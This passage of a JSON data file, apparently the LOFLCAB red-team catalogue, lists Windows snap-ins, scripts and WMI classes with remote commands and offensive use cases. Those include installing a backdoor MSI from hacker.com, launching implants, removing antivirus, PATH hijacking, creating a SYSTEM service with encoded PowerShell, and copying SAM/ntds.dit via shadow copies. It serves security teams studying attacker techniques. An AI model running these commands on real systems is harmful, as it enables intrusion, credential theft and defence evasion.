"Type":"MMC","Name":"tsconfig.msc","Description":"Remote Desktop Session Host Configuration","Updated":"2023-07-01","Toolsets":["GUI","Server"],"Commands":[{"Command":"tsconfig.msc","Description":"Remote Desktop Session Host Configuration","Usecases":null,"Function":"Manage","Comments":null,"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/MMC/tsconfig/"},{
"Type":"MMC","Name":"tsgateway.msc","Description":"RD Gateway Manager","Updated":"2023-07-01","Toolsets":["GUI","RSAT"],"Commands":[{"Command":"tsgateway.msc","Description":"RD Gateway Manager","Usecases":["Disable auditing","Specify who can use the RD gateway and to which devices it can be used"],"Function":"Manage","Comments":["Right click on RD Gateway Manager -> Connect to RD Gateway Server -> Remote server: `DC1.ad.bitsadmin.com`"],"MitreAttack":null}],"Resources":null,"Detections":[{"Port":"135/TCP"}],"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/MMC/tsgateway/"},{
"Type":"MMC","Name":"virtmgmt.msc","Description":"Hyper-V Manager","Updated":"2023-07-01","Toolsets":["GUI","RSAT"],"Commands":[{"Command":"virtmgmt.msc","Description":"Hyper-V Manager","Usecases":["Connect to the console of a server which might be directly accessible because of an `AutoAdminLogon` registry setting, or because an admin has logged onto the console","Install an unmonitored offensive VM to use to pivot through the network"],"Function":"Manage","Comments":["Right click root node -> Connect to Server -> Remote server -> `HYPERV1.ad.bitsadmin.com`","Uses ports 5985/TCP (WinRM, for management and non-enhanced session) and 2197/TCP (VMRDP for Enhanced Session) - Once a VM screen is opened (little display appears to be rendered over WinRM)","If a screen is opened without using the enhanced session functionality, it continues to use WinRM"],"MitreAttack":null}],"Resources":null,"Detections":[{"Port":"5985/TCP"},{"Port":"2197/TCP"}],"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/MMC/virtmgmt/"},{
"Type":"MMC","Name":"wbadmin.msc","Description":"Windows Server Backup","Updated":"2023-07-01","Toolsets":["GUI","Server"],"Commands":[{"Command":"mmc.exe","Description":"Windows Server Backup","Usecases":["Purge backups?"],"Function":"Manage","Comments":["mmc.exe -> File -> Add/Remove Snap-In -> Windows Server Backup -> Add -> Another computer: `DC1.ad.bitsadmin.com` -> Finish -> OK"],"MitreAttack":["T1485"]}],"Resources":null,"Detections":[{"Port":"135/TCP"}],"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/MMC/wbadmin/"},{
"Type":"MMC","Name":"winsmgmt.msc","Description":"WINS","Updated":"2023-07-01","Toolsets":["GUI","RSAT"],"Commands":[{"Command":"winsmgmt.msc","Description":"WINS","Usecases":null,"Function":"Manage","Comments":["Right click -> Add Server -> WINS server: `DC1.ad.bitsadmin.com` -> OK -> The specified server name could not be validated","To add this server to the console, type the IP address: `10.0.10.10` -> OK"],"MitreAttack":null}],"Resources":null,"Detections":[{"Port":"445/TCP"},{"Port":"135/TCP"}],"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/MMC/winsmgmt/"},{
"Type":"MMC","Name":"wsecedit.dll","Description":"Security Configuration and Analysis","Updated":"2023-07-01","Toolsets":["Builtin","GUI"],"Commands":[{"Command":"mmc.exe","Description":"Security Configuration and Analysis","Usecases":null,"Function":"Manage","Comments":["Open via MMC's Add/Remove Snap-In -> Security Configuration and Analysis -> OK","Right click the node -> Open Database -> Enter whatever name -> Open -> Open the .inf file"],"MitreAttack":null},{"Command":"mmc.exe","Description":"Security Templates","Usecases":null,"Function":"Manage","Comments":["Open via MMC's Add/Remove Snap-In -> Security Configuration and Analysis -> OK","Used to create .inf files from [secpol.msc](../secpol) settings"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/MMC/wsecedit/"},{
"Type":"MMC","Name":"wsus.msc","Description":"Update Services","Updated":"2023-07-01","Toolsets":["GUI","RSAT"],"Commands":[{"Command":"wsus.msc","Description":"Update Services","Usecases":["Deploy malicious updates"],"Function":"Manage","Comments":["Right click -> Connect to Server","Port 5830/TCP is used in case of HTTP, port 5831/TCP is used in case of TLS"],"MitreAttack":null}],"Resources":null,"Detections":[{"Port":"5830/TCP"},{"Port":"5831/TCP"}],"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/MMC/wsus/"},{
"Type":"Scripts","Name":"ospp.vbs","Description":"Configure volume licensed versions of Office products","Updated":"2023-07-01","Toolsets":["Extra"],"Commands":[{"Command":"cscript.exe ospp.vbs W10.ad.bitsadmin.com /dstatusall","Description":"Show Office activation information","Usecases":null,"Function":"Misc","Comments":null,"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Scripts/ospp/"},{
"Type":"Scripts","Name":"pubprn.vbs","Description":"Publishes a printer to the Active Directory Domain Services","Updated":"2023-07-01","Toolsets":["Builtin","TODO"],"Commands":[{"Command":"cscript pubprn.vbs","Description":null,"Usecases":null,"Function":"Manage","Comments":["Script is located in the `%SystemRoot%\\System32\\printing_Admin_Scripts\\<language>` directory"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Scripts/pubprn/"},{
"Type":"Scripts","Name":"slmgr.vbs","Description":"Obtain volume activation information","Updated":"2023-07-01","Toolsets":["Builtin"],"Commands":[{"Command":"cscript.exe slmgr.vbs W10.ad.bitsadmin.com /dlv","Description":"Show Windows activation information","Usecases":null,"Function":"Misc","Comments":null,"MitreAttack":null},{"Command":"cscript.exe slmgr.vbs W10.ad.bitsadmin.com /upk","Description":"Uninstall Windows product key","Usecases":["Cripple Windows activation to maybe have an admin user connect to the system to fix it"],"Function":"Misc","Comments":null,"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Scripts/slmgr/"},{
"Type":"Scripts","Name":"winrm.cmd","Description":"Windows Remote Management","Updated":"2023-07-01","Toolsets":["Builtin"],"Commands":[{"Command":"winrm.vbs get wmicimv2/Win32_Process?Handle=3456 -r:W10.ad.bitsadmin.com","Description":"Check process details","Usecases":["Reconnaissance on running processes"],"Function":"Processes","Comments":null,"MitreAttack":["T1057","T1021.006"]},{"Command":"winrm.vbs invoke Create wmicimv2/Win32_Process -r:W10.ad.bitsadmin.com @{CommandLine=\"notepad.exe\";CurrentDirectory=\"C:\\\"}","Description":"Lauch process","Usecases":["After having copied an implant over SMB, launch it"],"Function":"Execute","Comments":null,"MitreAttack":["T1047","T1021.006"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Scripts/winrm/"},{
"Type":"WMI","Name":"CIM_DataFile","Description":"Type of logical file that is a named collection of data or executable code","Updated":"2024-12-13","Toolsets":["Builtin","CIMSession"],"Commands":[{"Command":"Get-CimInstance -Query \"Select * from CIM_DataFile Where ((Drive = 'C:') AND (FileName = 'ntuser') AND (Extension = 'dat'))\" -CimSession $s","Description":"Locate files","Usecases":"Perform reconaissance on filesystem","Function":"Data","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","Pretty slow","Namespace: `ROOT\\Cimv2`"],"MitreAttack":null},{"Command":"$f = Get-CimInstance -ClassName CIM_DataFile -Filter \"Name='C:\\\\Unattend.xml'\" -CimSession $s\n$f | Invoke-CimMethod -Name Copy -Arguments @{FileName='C:\\\\Users\\\\Public\\\\Unattend.xml'}\n","Description":"Copy file","Usecases":"Copy file to Public share to copy it from there","Function":"Data","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/WMI/CIM_DataFile/"},{
"Type":"WMI","Name":"CIM_Directory","Description":"Type of file that logically groups data files 'contained' in it, and provides path information for the grouped files","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession","TODO"],"Commands":[{"Command":null,"Description":null,"Usecases":null,"Function":"Data","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","Namespace: `ROOT\\Cimv2`"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/WMI/CIM_Directory/"},{
"Type":"WMI","Name":"CIM_LogicalFile","Description":"Represents a named collection of data located in a file system on a storage extent","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession","TODO"],"Commands":[{"Command":null,"Description":null,"Usecases":null,"Function":"Data","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","Namespace: `ROOT\\Cimv2`"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/WMI/CIM_LogicalFile/"},{
"Type":"WMI","Name":"MSFT_DNSClientCache","Description":"Represents a record in a DNS client cache","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession"],"Commands":[{"Command":"Get-CimInstance -Namespace ROOT\\StandardCimv2 -ClassName MSFT_DNSClientCache -CimSession $s","Description":"List cached DNS entries","Usecases":["Reconnaissance on the network/Internet activities on the computer"],"Function":"Network","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","See also [Get-DnsClientCache](../../Cmdlets/Get-DnsClientCache)","Namespace: `ROOT\\StandardCimv2`"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/WMI/MSFT_DNSClientCache/"},{
"Type":"WMI","Name":"MSFT_NetFirewallRule","Description":"Represents a Windows firewall rule","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession"],"Commands":[{"Command":"$fwrule = Get-CimInstance -Namespace ROOT\\StandardCimv2 -ClassName MSFT_NetFirewallRule -Filter 'DisplayName=\"Remote Desktop - Shadow (TCP-In)\"' -CimSession $s\n$fwrule\n$fwrule | Invoke-CimMethod -MethodName Enable\n","Description":"Enable firewall rule","Usecases":null,"Function":"Manage","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","Namespace: `ROOT\\StandardCimv2`"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/WMI/MSFT_NetFirewallRule/"},{
"Type":"WMI","Name":"StdRegProv","Description":"The StdRegProv class contains methods that manipulate system registry keys and values","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession"],"Commands":[{"Command":"Invoke-CimMethod -ClassName StdRegProv -MethodName GetDWORDValue -Arguments @{hDefKey=[uint32]2147483650; sSubKeyName=\"Software\\Policies\\Microsoft\\Windows NT\\Terminal Services\"; sValueName=\"Shadow\"} -CimSession $s","Description":"Query value","Usecases":null,"Function":"Registry","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","Namespace: `ROOT\\Cimv2`"],"MitreAttack":null},{"Command":"Invoke-CimMethod -ClassName StdRegProv -MethodName SetDWORDValue -Arguments @{hDefKey=[uint32]2147483650; sSubKeyName=\"Software\\Policies\\Microsoft\\Windows NT\\Terminal Services\"; sValueName=\"Shadow\"; uValue=[uint32]2} -CimSession $s","Description":"Set value","Usecases":null,"Function":"Registry","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","Namespace: `ROOT\\Cimv2`"],"MitreAttack":null},{"Command":"Invoke-CimMethod -ClassName StdRegProv -MethodName DeleteValue -Arguments @{hDefKey=[uint32]2147483650; sSubKeyName=\"Software\\Policies\\Microsoft\\Windows NT\\Terminal Services\"; sValueName=\"Shadow\"} -CimSession $s","Description":"Delete value","Usecases":null,"Function":"Registry","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","Namespace: `ROOT\\Cimv2`"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/WMI/StdRegProv/"},{
"Type":"WMI","Name":"Win32_DfsNode","Description":"Represents a root or a link of a domain based or a standalone distributed file system (DFS)","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession","TODO"],"Commands":[{"Command":null,"Description":null,"Usecases":null,"Function":"Data","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","Namespace: `ROOT\\Cimv2`"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/WMI/Win32_DfsNode/"},{
"Type":"WMI","Name":"Win32_Environment","Description":"Represents an environment or system environment setting on a Windows computer system","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession"],"Commands":[{"Command":"New-CimInstance -ClassName Win32_Environment -Property @{Name=\"PATH\";VariableValue=\"C:\\hackertools; C:\\Windows\\System32;C:\\Windows\";UserName=\"<SYSTEM>\"} -CimSession $s","Description":"Set environment variable","Usecases":["Change PATH environment variable for search order hijacking"],"Function":"Manage","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","For the VariableValue, first obtain the current `PATH` using `Get-CimInstance` and then prefix it with the malicious path","Namespace: `ROOT\\Cimv2`"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/WMI/Win32_Environment/"},{
"Type":"WMI","Name":"Win32_NTLogEvent","Description":"Displays the Windows Event Log","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession"],"Commands":[{"Command":"Get-CimInstance -ClassName Win32_NTLogEvent -Filter \"LogFile = 'Security' AND EventCode = '4624'\" -CimSession $s","Description":"List logons on a system","Usecases":["Understand which accounts are used on a system"],"Function":"Logs","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/WMI/Win32_NTLogEvent/"},{
"Type":"WMI","Name":"Win32_OperatingSystem","Description":"Represents a Windows-based operating system installed on a computer","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession"],"Commands":[{"Command":"Get-CimInstance Win32_OperatingSystem -CimSession $s | fl *","Description":"Information about OS","Usecases":["Reconnaissance of target operating system"],"Function":"Recon","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","See also [systeminfo.exe](../../Binaries/systeminfo)","Namespace: `ROOT\\Cimv2`","Alternative: `CIM_OperatingSystem`"],"MitreAttack":["TA0043"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/WMI/Win32_OperatingSystem/"},{
"Type":"WMI","Name":"Win32_Process","Description":"Represents a process on an operating system","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession"],"Commands":[{"Command":"Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = 'C:\\tmp\\implant.exe'} -CimSession $s","Description":"Launch executable","Usecases":["Launch implant"],"Function":"Execute","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","Namespace: `ROOT\\Cimv2`"],"MitreAttack":["TA0002"]},{"Command":"Get-CimInstance -ClassName Win32_Process -CimSession $s | select ProcessId,Name,CommandLine | ft * -AutoSize -Wrap","Description":"List running processes","Usecases":["Launch implant"],"Function":"Processes","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","Namespace: `ROOT\\Cimv2`"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/WMI/Win32_Process/"},{
"Type":"WMI","Name":"Win32_Product","Description":"Represent products as they are installed by MSI","Updated":"2023-08-25","Toolsets":["Builtin","CIMSession"],"Commands":[{"Command":"Get-CimInstance -ClassName Win32_Product -CimSession $s | Select-Object Caption,Vendor,Version,InstallLocation","Description":"List installed software","Usecases":["Perform reconnaissance on installed security software"],"Function":"Manage","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","Namespace: `ROOT\\Cimv2`"],"MitreAttack":["T1218.007"]},{"Command":"Invoke-CimMethod -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation=\"https://hacker.com/backdoor.msi\"; Options=\"\"; AllUsers=$true} -CimSession $s","Description":"Install software","Usecases":["Launch and install malicious .msi package"],"Function":"Execute","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","Namespace: `ROOT\\Cimv2`",".msi file needs to be available on the target host"],"MitreAttack":["T1218.007"]},{"Command":"Get-CimInstance Win32_Product -Filter 'Caption=\"Antivirus Software caption\"' -CimSession $s | Remove-CimInstance","Description":"Uninstall software","Usecases":["Remove security software"],"Function":"Manage","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","Namespace: `ROOT\\Cimv2`"],"MitreAttack":["T1218.007","T1562.001"]}],"Resources":["https://blog.bitsadmin.com/living-off-the-foreign-land-windows-as-offensive-platform-part-3#execute-command-lines"],"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/WMI/Win32_Product/"},{
"Type":"WMI","Name":"Win32_QuickFixEngineering","Description":"Represents a small system-wide update, commonly referred to as a quick-fix engineering (QFE) update, applied to the current operating system","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession"],"Commands":[{"Command":"Get-CimInstance Win32_QuickFixEngineering -CimSession $s","Description":"List of installed KBs","Usecases":["List OS info and installed security updates and feed them to WES-NG to identify vulnerabilities"],"Function":"Recon","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","See also [systeminfo.exe](../../Binaries/systeminfo)","Namespace: `ROOT\\Cimv2`"],"MitreAttack":["TA0043"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/WMI/Win32_QuickFixEngineering/"},{
"Type":"WMI","Name":"Win32_Service","Description":"Represents a service on a computer system running Windows","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession"],"Commands":[{"Command":"$tssvc = Get-CimInstance -Filter 'Name=\"TermService\"' -ClassName Win32_Service -CimSession $s\n$tssvc\n$tssvc | Invoke-CimMethod -MethodName StartService\n","Description":"Start service","Usecases":null,"Function":"Execute","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","Namespace: `ROOT\\Cimv2`"],"MitreAttack":["T1569.002"]},{"Command":"Get-CimInstance -ClassName Win32_Service -CimSession $s","Description":"List services","Usecases":["Reconnaissance on installed services"],"Function":"Processes","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)"],"MitreAttack":null},{"Command":"Get-CimInstance -Filter 'Name=\"TermService\"' -ClassName Win32_Service -CimSession $s","Description":"Obtain a specific service instance","Usecases":["Start or stop a service"],"Function":"Processes","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)"],"MitreAttack":null},{"Command":"Invoke-WmiMethod -Class Win32_Service -Name Create -ArgumentList $false,\"Print Spooler (x64)\",([byte]1),$null,$null,\"spoolsv64\",\"C:\\Windows\\System32\\cmd.exe /c powershell -e bHM=\",$null,([byte]16),\"Manual\",\"NT AUTHORITY\\SYSTEM\",\"\"","Description":"Create new service","Usecases":null,"Function":"Execute","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)"],"MitreAttack":["TA0002"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/WMI/Win32_Service/"},{
"Type":"WMI","Name":"Win32_ShadowCopy","Description":"Storage extent that represents a duplicate copy of the original volume at a previous time","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession"],"Commands":[{"Command":"$r = Invoke-CimMethod -ClassName Win32_ShadowCopy -MethodName Create -Arguments @{Volume='C:\\'} -CimSession $s\n$r\n","Description":"Create new shadow copy","Usecases":null,"Function":"Data","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","Namespace: `ROOT\\Cimv2`"],"MitreAttack":null},{"Command":"Get-CimInstance -ClassName Win32_ShadowCopy -CimSession $s -Filter \"ID=`\"$($r.ShadowID)`\"\"","Description":"Show details of a volume shadow copy","Usecases":["Get shadow copy details for use with [Copy-Item](../../Cmdlets/Copy-Item) to obtain `SAM`/`SYSTEM`/`SECURITY`/`ntds.dit` files"],"Function":"Data","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","Namespace: `ROOT\\Cimv2`"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/WMI/Win32_ShadowCopy/"},{
"Type":"WMI","Name":"Win32_SystemDriver","Description":"Represents the system driver for a base service","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession","TODO"],"Commands":[{"Command":null,"Description":null,"Usecases":null,"Function":"Processes","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","Namespace: `ROOT\\Cimv2`"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/WMI/Win32_SystemDriver/"}]
